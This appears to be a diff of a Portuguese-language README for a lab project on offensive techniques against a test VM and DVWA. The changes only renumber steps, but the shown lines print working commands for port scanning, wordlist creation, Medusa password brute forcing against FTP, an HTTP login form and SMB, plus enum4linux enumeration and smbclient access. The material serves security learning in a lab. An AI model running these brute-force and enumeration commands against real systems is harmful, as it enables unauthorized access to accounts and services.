@@ -32,7 +32,7 @@ O objetivo deste projeto foi compreender as técnicas ofensivas e refletir sobre
 <br>
 
 ## 3 - 🚪 Cenário de Ataque no Protocolo FTP:
- * **Etapa 1:** Escanear possiveis portas abertas e o tipo de serviço:
+ * **3.1:** Escanear possiveis portas abertas e o tipo de serviço:
    ```bash
    nmap -sV -p 21,22,80,445,139 coloque o IP
    ```
@@ -42,7 +42,7 @@ O objetivo deste projeto foi compreender as técnicas ofensivas e refletir sobre
 
 <br>
 
-* **Etapa 2:** Quebrando senhas com a ferramenta Medusa: Faça a criação de arquivos com possíveis nomes de usuários e senhas:
+* **3.2:** Quebrando senhas com a ferramenta Medusa: Faça a criação de arquivos com possíveis nomes de usuários e senhas:
  ```bash
 echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
 ```
@@ -55,13 +55,13 @@ echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
  * **Resultado da exploração:** Usuário e Login encontrados com sucesso ✔
 
 ## 4 - 📑 Cenários de Ataques em Formulários de Login:
-* **Etapa 3:** Entrar no site: DVWA
+* **4.1:** Entrar no site: DVWA
 ```bash
 192.168.56.102/dvwa/login.php
 ```
-**3.1 - Criar wordlists para usuários e senhas;**
+**4.2 - Criar wordlists para usuários e senhas;**
 
-**3.2 - Rodar o seguinte comando:**
+**4.3 - Rodar o seguinte comando:**
 ```bash
 medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http \
 -m PAGE: '/dvwa/login.php' \
@@ -73,17 +73,17 @@ medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http \
 - **Resumo:** O comando faz brute force no login do DVWA via HTTP, usando listas de usuários e senhas, enviando requisições do tipo POST, identificando falhas pelo texto “Login failed” e executando tudo em 6 tentativas acontecendo ao mesmo tempo.
 
 ## 5 - 💻 Cenário de Ataque SMB:
-* **Etapa 4:** Enumerar informações de sistemas Windows ou serviços SMB/Samba.
+* **5.1:** Enumerar informações de sistemas Windows ou serviços SMB/Samba.
 ```bash
 enum4linux -a 192.168.56.102 | tee enum4_output.txt
 ```
 * **Resultado da análise:** Acesso a listas de usuários, compartilhamentos disponiveis e até nome de dominio ✔
 
-* **Etapa 4.1:** Ataque ao SMB com a medusa
+* **5.2:** Ataque ao SMB com a medusa
 ```bash
 medusa -h 192.168.56.102 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50 
 ```
-* **Etapa 4.2:** Acesso ao servidor SMB:
+* **5.3:** Acesso ao servidor SMB:
 ```bash
 smbclient -L //192.168.56.102 -U msfadmin
 ```
